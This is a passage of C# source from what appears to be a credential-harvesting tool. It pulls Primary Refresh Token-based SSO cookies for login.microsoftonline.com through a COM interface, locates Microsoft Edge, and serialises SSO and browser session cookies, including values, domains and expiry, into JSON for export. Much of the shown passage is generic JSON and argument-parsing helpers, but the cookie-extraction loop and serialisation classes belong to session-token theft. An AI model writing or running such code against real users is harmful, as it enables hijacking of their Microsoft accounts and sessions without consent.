              + "Is this process elevated? (elevated token has no PRT)", (uint)hr));

        if (count == 0 || ptr == IntPtr.Zero)
            return list;

        int stride = Marshal.SizeOf(typeof(PopCookieInfoNative));
        for (uint i = 0; i < count; i++)
        {
            var raw = (PopCookieInfoNative)Marshal.PtrToStructure(
                new IntPtr(ptr.ToInt64() + i * (uint)stride),
                typeof(PopCookieInfoNative));

            string name = Marshal.PtrToStringUni(raw.Name);
            string data = Marshal.PtrToStringUni(raw.Data);

            // Free the strings allocated by COM (BSTR-style CoTaskMem)
            if (raw.Name     != IntPtr.Zero) Marshal.FreeCoTaskMem(raw.Name);
            if (raw.Data     != IntPtr.Zero) Marshal.FreeCoTaskMem(raw.Data);
            if (raw.P3PHeader != IntPtr.Zero) Marshal.FreeCoTaskMem(raw.P3PHeader);

            if (!string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(data))
            {
                // BrowserCore sometimes appends ";path=/;domain=..." — strip it.
                data = data.Split(new char[]{';'}, 2)[0].Trim();
                list.Add(new SsoCookie { Name = name, Data = data });
            }
        }

        Marshal.FreeCoTaskMem(ptr);
        return list;
    }

    // Find msedge.exe
    static string FindEdge()
    {
        string[] candidates = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                         "Microsoft\\Edge\\Application\\msedge.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                         "Microsoft\\Edge\\Application\\msedge.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                         "Microsoft\\Edge\\Application\\msedge.exe"),
        };
        foreach (string c in candidates)
            if (File.Exists(c)) return c;
        return null;
    }

    // -----------------------------------------------------------------------
    //  Minimal JSON helpers  (no external dependencies)
    // -----------------------------------------------------------------------
    static IEnumerable<string> SplitJsonObjects(string s)
    {
        int depth = 0, start = -1;
        for (int i = 0; i < s.Length; i++)
        {
            if      (s[i] == '{') { if (depth++ == 0) start = i; }
            else if (s[i] == '}') { if (--depth == 0 && start >= 0) { yield return s.Substring(start, i - start + 1); start = -1; } }
        }
    }

    static string ExtractStringField(string json, string field)
    {
        string key = "\"" + field + "\"";
        int ki = json.IndexOf(key, StringComparison.Ordinal);
        if (ki < 0) return null;
        int colon = json.IndexOf(':', ki + key.Length);
        if (colon < 0) return null;
        int q1 = json.IndexOf('"', colon + 1);
        if (q1 < 0) return null;
        var sb = new StringBuilder();
        for (int i = q1 + 1; i < json.Length; i++)
        {
            char c = json[i];
            if (c == '\\' && i + 1 < json.Length) { sb.Append(json[i + 1]); i++; }
            else if (c == '"') break;
            else sb.Append(c);
        }
        return sb.ToString();
    }

    static bool ExtractBoolField(string json, string field)
    {
        string key = "\"" + field + "\"";
        int ki = json.IndexOf(key, StringComparison.Ordinal);
        if (ki < 0) return false;
        int colon = json.IndexOf(':', ki + key.Length);
        if (colon < 0) return false;
        int vi = colon + 1;
        while (vi < json.Length && (json[vi] == ' ' || json[vi] == '\t' || json[vi] == '\r' || json[vi] == '\n')) vi++;
        return vi < json.Length && json[vi] == 't';  // "true" starts with 't'
    }

    static double ExtractNumberField(string json, string field)
    {
        string key = "\"" + field + "\"";
        int ki = json.IndexOf(key, StringComparison.Ordinal);
        if (ki < 0) return -1;
        int colon = json.IndexOf(':', ki + key.Length);
        if (colon < 0) return -1;
        int vi = colon + 1;
        while (vi < json.Length && (json[vi] == ' ' || json[vi] == '\t')) vi++;
        int end = vi;
        while (end < json.Length &&
               (char.IsDigit(json[end]) || json[end] == '-' || json[end] == '.' ||
                json[end] == 'e' || json[end] == 'E' || json[end] == '+')) end++;
        double d = -1;
        double.TryParse(json.Substring(vi, end - vi),
            System.Globalization.NumberStyles.Float,
            System.Globalization.CultureInfo.InvariantCulture, out d);
        return d;
    }

    static string JsonString(string s)
    {
        var sb = new StringBuilder("\"");
        foreach (char c in s)
        {
            switch (c)
            {
                case '"':  sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\n': sb.Append("\\n");  break;
                case '\r': sb.Append("\\r");  break;
                case '\t': sb.Append("\\t");  break;
                default:   sb.Append(c);      break;
            }
        }
        sb.Append('"');
        return sb.ToString();
    }

    // -----------------------------------------------------------------------
    //  Argument helpers
    // -----------------------------------------------------------------------
    static bool HasFlag(string[] args, string flag)
    {
        return Array.IndexOf(args, flag) >= 0;
    }

    static string GetOption(string[] args, string name)
    {
        int i = Array.IndexOf(args, name);
        if (i >= 0 && i + 1 < args.Length) return args[i + 1];
        return null;
    }

    // -----------------------------------------------------------------------
    class SsoCookie
    {
        public string Name;
        public string Data;
        public string ToJson()
        {
            return "{\"name\":"   + JsonString(Name)
                 + ",\"data\":"   + JsonString(Data)
                 + ",\"domain\":\"login.microsoftonline.com\"}";
        }
    }

    class EdgeCookie
    {
        public string Name;
        public string Value;
        public string Domain;
        public string Path;
        public bool   Secure;
        public bool   HttpOnly;
        public double Expires;
        public string SameSite;

        public string ToJson()
        {
            var sb = new StringBuilder();
            sb.Append("{\"name\":");
            sb.Append(JsonString(Name));
            sb.Append(",\"value\":");
            sb.Append(JsonString(Value));
            sb.Append(",\"domain\":");
            sb.Append(JsonString(Domain));
            sb.Append(",\"path\":");
            sb.Append(JsonString(Path ?? "/"));
            sb.Append(",\"secure\":");
            sb.Append(Secure ? "true" : "false");
            sb.Append(",\"httpOnly\":");
            sb.Append(HttpOnly ? "true" : "false");
            sb.Append(",\"sameSite\":");
            sb.Append(JsonString(SameSite ?? "None"));
            if (Expires > 0)
            {
                sb.Append(",\"expires\":");
                sb.Append(Expires.ToString("R",
                    System.Globalization.CultureInfo.InvariantCulture));
            }
            sb.Append("}");
            return sb.ToString();
        }
    }
}
